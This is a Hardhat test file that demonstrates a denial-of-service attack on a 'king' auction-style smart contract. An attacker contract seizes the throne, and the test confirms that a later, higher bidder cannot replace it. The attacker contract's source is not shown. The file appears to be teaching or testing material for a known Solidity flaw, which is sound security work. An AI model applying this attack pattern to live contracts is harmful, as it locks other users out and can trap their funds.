const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Denial of service vulnerability", function() {
    this.timeout(100000);

    it("Should deny service", async function() {
        // deploy king contract
        let [firstKing, thirdKing, attacker] = await ethers.getSigners();
        const dosFactory = await ethers.getContractFactory("king");
        const dosContract = await dosFactory.connect(firstKing).deploy(
            {
                value: ethers.utils.parseEther("1")
            }
        );
        await dosContract.deployed();
        expect(await dosContract._king()).to.equal(firstKing.address);

        // pre balance
        const preBalanceFirst = await ethers.provider.getBalance(firstKing.address);

        // deploy attacker
        const dosAttackerFactory = await ethers.getContractFactory("dosAttacker");
        const dosAttackerContract = await dosAttackerFactory.connect(attacker).deploy(
            dosContract.address
        );
        await dosAttackerContract.deployed();

        // attack
        await dosAttackerContract.connect(attacker).attack({
            value: ethers.utils.parseEther("2")
        });
        expect(await dosContract._king()).to.equal(dosAttackerContract.address);

        // expect 1 eth returned
        const postBalanceFirst = await ethers.provider.getBalance(firstKing.address);
        expect(postBalanceFirst.sub(preBalanceFirst)).to.equal(ethers.utils.parseEther("1"));

        try {
            // try new king
            await dosContract.connect(thirdKing).becomeKing({
                value: ethers.utils.parseEther("3")
            });
        } catch(e) {
            // console.log(e);
        }

        // confirm attacker still king
        expect(await dosContract._king()).to.equal(dosAttackerContract.address);
    });
});